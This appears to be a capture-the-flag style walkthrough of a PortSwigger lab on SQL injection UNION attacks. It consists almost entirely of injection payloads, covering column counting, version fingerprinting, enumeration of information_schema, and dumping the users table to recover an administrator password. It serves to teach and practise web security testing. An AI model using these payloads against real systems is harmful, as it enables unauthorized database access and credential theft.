Lab: SQL injection UNION attack, retrieving data from other tables

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

```bash
GET /filter?category=Pets'
```
```bash
GET /filter?category=Pets'--
```
```bash
Pets'order by 2--
Pets'order by 3--
```
```bash
Pets' UNION SELECT 'a','a'--
```
```bash
Pets' UNION SELECT @@version,'a'--

#error

Pets' UNION SELECT version(),'a'--

# PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1)
```
```bash
Pets' UNION SELECT table_name,NULL FROM information_schema.tables-- 

#users
```
```bash
Pets' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name= 'users'--

# username
# password
```
```bash
Pets' UNION SELECT username,password FROM users --
# administrator
# srfcxzpvzhr18ljttwh6
```
